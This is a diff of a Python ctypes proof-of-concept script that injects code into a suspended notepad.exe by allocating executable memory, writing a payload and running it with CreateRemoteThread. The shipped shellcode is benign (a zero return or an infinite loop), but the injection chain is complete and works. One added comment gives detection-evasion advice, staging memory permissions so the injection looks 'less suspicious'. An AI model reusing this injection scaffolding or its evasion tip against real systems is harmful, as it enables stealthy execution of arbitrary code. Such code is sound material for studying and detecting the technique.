@@ -1,17 +1,26 @@
 """
 Proof of Concept: Process Injection via CreateRemoteThread() (notepad.exe)
+- x64 process on x64 systems
 
-Payloads:
-    - simple shellcode to test/prove functionality
-    - expected GetExitCodeThread() return code listed
+Payloads shellcode:
+    - simple shellcodes to test/prove functionality
+    - expected GetExitCodeThread() return code detailed
 
 Steps:
-- Create process in SUSENDED state -> CreateProcessW()
-- Allocate memory, based on payload -> VirtualAllocEx()
-- Write payload into allocated memory -> WriteProcessMemory()
-- Confirm payload written correctly -> ReadProcessMemory()
-- Create a new thread, and execute payload -> CreateRemoteThread()
-- Resume original thread -> ResumeThread()
+------
+- Create SUSPENDED process                     -> CreateProcessW()
+- Allocate memory                              -> VirtualAllocEx()
+- Write payload into allocated memory          -> WriteProcessMemory()
+- Confirm payload written correctly            -> ReadProcessMemory()
+- Create a new thread, and execute payload     -> CreateRemoteThread()
+- Resume original thread                       -> ResumeThread()
+
+
+TODO:
+- implement VirtualFreeEx()
+- check for system architecture (for payloads)
+- in VirtualAllocEx(), implement PAGE_EXECUTE_READ -> VirtualProtectEx()
+- validate return code for WaitForSingleObject()
 """
 
 
@@ -29,14 +38,14 @@ kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
 # Payloads
 # ----------------------------------
 
-# Deterministic, return 0 from RAX
+# Deterministic, return 0 from RAX -> straight up RET is non-deterministic here
 # GetExitcodethread() == 0
 payload = b"\x48\x31\xC0\xC3"       # xor rax, rax; ret
 
 # Infinite loop, thread will sit at 100% CPU usage for one core.
 # GetExitCodeThread() == 259
 '''
-payload = b"\xEB\xFE"
+payload = b"\xEB\xFE"    # JMP SHORT -2
 '''
 
 
@@ -144,6 +153,13 @@ kernel32.CreateRemoteThread.argtypes = [
 kernel32.CreateRemoteThread.restype = wintypes.HANDLE
 
 
+kernel32.GetExitCodeThread.argtypes = [
+    wintypes.HANDLE,                  # hThread
+    ctypes.POINTER(wintypes.DWORD),   # [o] lpExitCode
+]
+kernel32.GetExitCodeThread.restype = wintypes.BOOL
+
+
 kernel32.ReadProcessMemory.argtypes = [
     wintypes.HANDLE,                    # hProcess
     wintypes.LPCVOID,                   # lpBaseAddress
@@ -171,6 +187,14 @@ kernel32.VirtualAllocEx.argtypes = [
 ]
 kernel32.VirtualAllocEx.restype = wintypes.LPVOID
 #kernel32.VirtualAllocEx.restype = ctypes.c_void_p
+
+
+kernel32.WaitForSingleObject.argtypes = [
+    wintypes.HANDLE,  # hHandle
+    wintypes.DWORD,    # dwMilliseconds
+]
+kernel32.WaitForSingleObject.restype = wintypes.DWORD
+
 
 kernel32.WriteProcessMemory.argtypes = [
     wintypes.HANDLE,                    # hProcess
@@ -215,8 +239,7 @@ def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
 def create_process(
     app: str=r"c:\windows\system32\notepad.exe",
     flags: int=None
-) -> tuple[wintypes.HANDLE, wintypes.HANDLE,
-           wintypes.DWORD, wintypes.DWORD]:
+) -> tuple[wintypes.HANDLE, wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD]:
     
     # define arguments
     lpApplicationName = app
@@ -251,9 +274,8 @@ def create_process(
         print(f"\n[+] CreateProcessW() Successful:\n" + "-" *32)
         print(f"Process created in Suspended State: {lpApplicationName}")
 
-        # return handles/Ids to thread and process
+        # return Handles/Ids to thread and process
         
-
         hThread = wintypes.HANDLE(lpProcessInformation.hThread)
         hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
         dwThreadId = lpProcessInformation.dwThreadId
@@ -290,7 +312,7 @@ def thread_suspend_check(hThread: wintypes.HANDLE) -> None:
     if prev_count == 0xFFFFFFFF:
         raise OSError("SuspendThread() failed")
     
-    # technically current count += 1, but resetting after print/call
+    # technically, current count == count+1, but resetting after print/call
     print(f"\n[+] Confirming state: SuspendThread():\n" + "-" *38)
     print(f"Thread in suspended state, current Suspect Count: {prev_count}")
     
@@ -308,16 +330,27 @@ def virtual_alloc_ex(
     """
     Allocate memory space in suspended process
     - returns pointer to allocated memory, in remote process
+
+    Note: regarding PAGE_EXECUTE_READWRITE for flAllocationType (4th arg), in VirtualAllocEx()
+    - apparently quite noisy, easy to detect
+
+    Less suspicious, as it is staged:
+    - set PAGE_READWRITE (here)     -> VirtualAllocEx()
+    - write payload                 -> WriteProcessMemory()
+    - set PAGE_EXECUTE_READ         -> VirtualProtectEx() 
+    - execute                       -> CreateRemoteThread()
     """
     
     lpAddress = ctypes.c_void_p(0)
     dwSize = ctypes.c_size_t(size)
 
-    ptr = kernel32.VirtualAllocEx(hProcess,
-                            lpAddress,
-                            dwSize,
-                            MEM_COMMIT | MEM_RESERVE,
-                            PAGE_EXECUTE_READWRITE)
+    ptr = kernel32.VirtualAllocEx(
+        hProcess,
+        lpAddress,
+        dwSize,
+        MEM_COMMIT | MEM_RESERVE,  # Reserve space, AND allocate immediately
+        PAGE_EXECUTE_READWRITE
+    )
 
     if not ptr:
         raise winerr()
@@ -336,19 +369,14 @@ def write_payload(
     lpBuffer: bytes
 ) -> None:
 
-    """
-    Write payload into the allocted memory of the remote process
-    - hProcess ->handle to remote process
-    - lpBaseAddress -> pointer to allocated memory in remote process
-    - payload -> payload to write into allocated memory
-    """
+    """ Write payload into the allocted memory of the remote process """
 
     bytes_written = ctypes.c_size_t()   # number of bytes written
     nSize = len(lpBuffer)
 
     payload_write = kernel32.WriteProcessMemory(
         hProcess,
-        lpBaseAddress,
+        lpBaseAddress,    # pointer to allocated memory in remote process
         lpBuffer,
         nSize,
         ctypes.byref(bytes_written)
@@ -369,13 +397,10 @@ def confirm_payload_write(
     payload: bytes
 ) -> None:
 
-    """
-    Check/confirm payload written by write_payload()
-    - prints bytes-written, actual payload, and checks for match
-    """
+    """ Check/confirm payload written by write_payload() as intended """
 
     nSize = len(payload)
-                           
+
     lpBuffer = ctypes.create_string_buffer(nSize)
     bytes_read = ctypes.c_size_t()
 
@@ -403,17 +428,13 @@ def create_remote_thread(
     lpBaseAddress: wintypes.LPVOID,
 ) -> wintypes.HANDLE:
 
-    """
-    Create a remote thread in the remote process, at lpBaseAddress
-    - thread executes immediately upon creation
-    - returns handle to the created remote thread
-    """
+    """ Create a remote thread in the remote process, at lpBaseAddress """
 
     lpThreadAttributes = None
     dwStackSize = 0
     lpStartAddress = lpBaseAddress
     lpParameter = None
-    dwCreationFlags = 0 # thread runs immediately after creation
+    dwCreationFlags = 0     # thread runs immediately after creation
     lpThreadId = wintypes.DWORD()
     
     hThread_new = kernel32.CreateRemoteThread(
@@ -454,9 +475,7 @@ def resume_orig_process(
     dwProcessId: wintypes.DWORD
 ) -> None:
     
-    """
-    Resume execution of original process/thread
-    """
+    """ Resume execution of original process/thread """
 
     print(f"\n[+] Resuming original thread:\n" + "-" *29)
     print(f"-> ProcessId: {dwProcessId}")
@@ -486,8 +505,7 @@ thread_suspend_check(hThread)
 # Allocate memory, and write payload
 # ----------------------------------
 
-# call VirtualAllocEx() to allocate memory space
-# returns -> pointer to base address of memory
+# call VirtualAllocEx() to allocate memory space <- pointer to base address of memory
 lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))
 
 # write payload into allocated memory
@@ -505,9 +523,10 @@ pause()
 # calls CreateRemoteThread()
 hThread_new = create_remote_thread(hProcess, lpBaseAddress)
 
-# validation
+# pause/wait timer (eg for infinite loop test)
 kernel32.WaitForSingleObject(hThread_new, 5000)
 
+# validate thread's exit code
 exit_code = wintypes.DWORD()
 kernel32.GetExitCodeThread(hThread_new, ctypes.byref(exit_code))
 
